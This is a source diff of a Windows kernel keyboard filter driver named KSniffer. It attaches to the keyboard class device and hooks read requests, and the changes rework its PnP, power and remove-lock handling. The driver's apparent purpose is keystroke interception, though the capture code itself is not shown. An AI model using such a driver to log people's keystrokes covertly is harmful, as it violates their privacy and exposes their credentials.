@@ -69,9 +69,15 @@ NTSTATUS DispatchPower(PDEVICE_OBJECT fido, PIRP Irp);
 VOID KSnifferDriverUnload(IN PDRIVER_OBJECT DeviceObject);            
 NTSTATUS KSnifferAddDevice(PDRIVER_OBJECT pDrvObj, PDEVICE_OBJECT pPhysDevObj);   
 
+
+NTSTATUS UsageNotificationCompletionRoutine(PDEVICE_OBJECT fido, PIRP Irp, PDEVICE_EXTENSION pdx);
+NTSTATUS StartDeviceCompletionRoutine(PDEVICE_OBJECT fido, PIRP Irp, PDEVICE_EXTENSION pdx);
+VOID RemoveDevice(IN PDEVICE_OBJECT fido);
+
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)        
 {
-    STRING ntNameString;
+	
+	STRING ntNameString;
     UNICODE_STRING ntUnicodeString;
 	UNICODE_STRING DriverName;
 	UNICODE_STRING DevName;
@@ -79,7 +85,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryP
 	UCHAR ucCnt = 0;
 	PDRIVER_OBJECT AudioDriver = NULL;
 	PDEVICE_OBJECT DeviceObject = NULL;
-	UNREFERENCED_PARAMETER(RegistryPath);
+	
+	DbgPrintEx(DPFLTR_DEFAULT_ID,DPFLTR_ERROR_LEVEL,"Device Add In\n");
+    RtlInitAnsiString(&ntNameString,"\\Device\\KeyboardClass0");
+    RtlAnsiStringToUnicodeString(&ntUnicodeString,&ntNameString,TRUE);
+	RtlInitUnicodeString(&DevName,L"\\Device\\KBfilter0");
+	RtlInitUnicodeString(&DriverName,L"\\Driver\\usbaudio");
+
 	
 	DbgPrintEx(DPFLTR_DEFAULT_ID,DPFLTR_ERROR_LEVEL,"Enter DriverEntry \n");
 	
@@ -92,11 +104,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryP
     DriverObject->MajorFunction[IRP_MJ_READ] = KSnifferDispatchRead;
 	DriverObject->DriverUnload = KSnifferDriverUnload;
 	DriverObject->DriverExtension->AddDevice = KSnifferAddDevice;
-
-    RtlInitAnsiString(&ntNameString,"\\Device\\KeyboardClass0");
-    RtlAnsiStringToUnicodeString(&ntUnicodeString,&ntNameString,TRUE);
-	RtlInitUnicodeString(&DevName,L"\\Device\\KBfilter0");
-	RtlInitUnicodeString(&DriverName,L"\\Driver\\usbaudio");
+	
 	
 	ObReferenceObjectByName( &DriverName,
                            OBJ_CASE_INSENSITIVE,
@@ -142,7 +150,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryP
 		return STATUS_SUCCESS;
 	}
 	RtlFreeUnicodeString( &ntUnicodeString );
-	DbgPrintEx(DPFLTR_DEFAULT_ID,DPFLTR_ERROR_LEVEL,"Successfully connected to keyboard device\n");
+
 	return STATUS_SUCCESS;
 }
 
@@ -182,25 +190,20 @@ NTSTATUS KSnifferReadComplete( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN P
 }
 
 NTSTATUS KSnifferDispatchGeneral(                //通用事件处理例程
-    IN PDEVICE_OBJECT DeviceObject,
+    IN PDEVICE_OBJECT fido,
     IN PIRP          Irp )
 {
-	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(Irp);
-	PIO_STACK_LOCATION nextIrpStack    = IoGetNextIrpStackLocation(Irp);
+	PDEVICE_EXTENSION pdx = (PDEVICE_EXTENSION) fido->DeviceExtension;
+	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
+	NTSTATUS status;
 	DbgPrintEx(DPFLTR_DEFAULT_ID,DPFLTR_ERROR_LEVEL,"This is General\n");
-	
-	Irp->IoStatus.Status      = STATUS_SUCCESS;
-	Irp->IoStatus.Information = 0; 
-
-	if( DeviceObject == HookDeviceObject ) 
-	{
-		*nextIrpStack = *currentIrpStack;
-		return IoCallDriver( kbdDevice, Irp );
-	}
-	else
-	{
-		return STATUS_SUCCESS;
-	}
+	status = IoAcquireRemoveLock(&pdx->RemoveLock, Irp);
+	if (!NT_SUCCESS(status))
+		return CompleteRequest(Irp, status, 0);
+	IoSkipCurrentIrpStackLocation(Irp);
+	status = IoCallDriver(pdx->LowerDeviceObject, Irp);
+	IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
+	return status;
 }
 
 VOID KSnifferDriverUnload(IN PDRIVER_OBJECT DeviceObject)
@@ -213,33 +216,54 @@ VOID KSnifferDriverUnload(IN PDRIVER_OBJECT DeviceObject)
 
 NTSTATUS KSnifferAddDevice(IN PDRIVER_OBJECT DeviceObject,IN PDEVICE_OBJECT FunctionalDeviceObject)
 {
-	UNREFERENCED_PARAMETER(DeviceObject);
-	UNREFERENCED_PARAMETER(FunctionalDeviceObject);
-	DbgPrintEx(DPFLTR_DEFAULT_ID,DPFLTR_ERROR_LEVEL,"Device Add In\n");
+	DbgPrintEx(DPFLTR_DEFAULT_ID,DPFLTR_ERROR_LEVEL,"Successfully connected to keyboard device\n");
 	FunctionalDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
 	return STATUS_SUCCESS;
 }
 
 NTSTATUS DispatchPnp(PDEVICE_OBJECT fido, PIRP Irp)
 {
+	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
+	ULONG fcn = stack->MinorFunction;
+	NTSTATUS status;
 	PDEVICE_EXTENSION pdx = (PDEVICE_EXTENSION) fido->DeviceExtension;
-	PIO_STACK_LOCATION stack;
-	ULONG fcn;
-	NTSTATUS status = IoAcquireRemoveLock(&pdx->RemoveLock, Irp);
+	status = IoAcquireRemoveLock(&pdx->RemoveLock, Irp);
 	if (!NT_SUCCESS(status))
 		return CompleteRequest(Irp, status, 0);
-	stack = IoGetCurrentIrpStackLocation(Irp);
-	fcn = stack->MinorFunction; 
+		if (fcn == IRP_MN_DEVICE_USAGE_NOTIFICATION)
+	{						// usage notification
+		if (!fido->AttachedDevice || (fido->AttachedDevice->Flags & DO_POWER_PAGABLE))
+			fido->Flags |= DO_POWER_PAGABLE;
+		IoCopyCurrentIrpStackLocationToNext(Irp);
+		IoSetCompletionRoutine(Irp, (PIO_COMPLETION_ROUTINE) UsageNotificationCompletionRoutine,
+			(PVOID) pdx, TRUE, TRUE, TRUE);
+		return IoCallDriver(pdx->LowerDeviceObject, Irp);
+	}						// usage notification
+
+	// Handle start device specially in order to correctly inherit
+	// FILE_REMOVABLE_MEDIA
+	if (fcn == IRP_MN_START_DEVICE)
+	{						// device start
+		IoCopyCurrentIrpStackLocationToNext(Irp);
+		IoSetCompletionRoutine(Irp, (PIO_COMPLETION_ROUTINE) StartDeviceCompletionRoutine,
+			(PVOID) pdx, TRUE, TRUE, TRUE);
+		return IoCallDriver(pdx->LowerDeviceObject, Irp);
+	}						// device start
+
+	// Handle remove device specially in order to cleanup device stack
+	if (fcn == IRP_MN_REMOVE_DEVICE)
+	{						// remove device
+		IoSkipCurrentIrpStackLocation(Irp);
+		status = IoCallDriver(pdx->LowerDeviceObject, Irp);
+		IoReleaseRemoveLockAndWait(&pdx->RemoveLock, Irp);
+		RemoveDevice(fido);
+		return status;
+	}						// remove device
+
+	// Simply forward any other type of PnP request
 	IoSkipCurrentIrpStackLocation(Irp);
 	status = IoCallDriver(pdx->LowerDeviceObject, Irp);
-	if (fcn == IRP_MN_REMOVE_DEVICE)
-	{
-		IoReleaseRemoveLockAndWait(&pdx->RemoveLock, Irp);
-		IoDetachDevice(pdx->LowerDeviceObject);
-		IoDeleteDevice(fido);
-	}
-	else
-		IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
+	IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
 	return status;
 }
 
@@ -253,9 +277,44 @@ NTSTATUS DispatchPower(PDEVICE_OBJECT fido, PIRP Irp)
 	if (!NT_SUCCESS(status))
 	{
 		return CompleteRequest(Irp, status, 0);
-		IoSkipCurrentIrpStackLocation(Irp);
-		status = PoCallDriver(pdx->LowerDeviceObject, Irp);
-		IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
-		return status;
 	}
+	IoSkipCurrentIrpStackLocation(Irp);
+	status = PoCallDriver(pdx->LowerDeviceObject, Irp);
+	IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
+	return status;
+}
+
+
+NTSTATUS UsageNotificationCompletionRoutine(PDEVICE_OBJECT fido, PIRP Irp, PDEVICE_EXTENSION pdx)
+{							// UsageNotificationCompletionRoutine
+	if (Irp->PendingReturned)
+		IoMarkIrpPending(Irp);
+	// If lower driver cleared pageable flag, we must do the same
+	if (!(pdx->LowerDeviceObject->Flags & DO_POWER_PAGABLE))
+		fido->Flags &= ~DO_POWER_PAGABLE;
+	IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS StartDeviceCompletionRoutine(PDEVICE_OBJECT fido, PIRP Irp, PDEVICE_EXTENSION pdx)
+{							// StartDeviceCompletionRoutine
+	if (Irp->PendingReturned)
+		IoMarkIrpPending(Irp);
+	// Inherit FILE_REMOVABLE_MEDIA flag from lower object. This is necessary
+	// for a disk filter, but it isn't available until start-device time. Drivers
+	// above us may examine the flag as part of their own start-device processing, too.
+	if (pdx->LowerDeviceObject->Characteristics & FILE_REMOVABLE_MEDIA)
+		fido->Characteristics |= FILE_REMOVABLE_MEDIA;
+	IoReleaseRemoveLock(&pdx->RemoveLock, Irp);
+	return STATUS_SUCCESS;
+}
+
+VOID RemoveDevice(IN PDEVICE_OBJECT fido)
+{							// RemoveDevice
+	PDEVICE_EXTENSION pdx;
+	PAGED_CODE();
+	pdx = (PDEVICE_EXTENSION) fido->DeviceExtension;
+	if (pdx->LowerDeviceObject)
+		IoDetachDevice(pdx->LowerDeviceObject);
+	IoDeleteDevice(fido);
 }
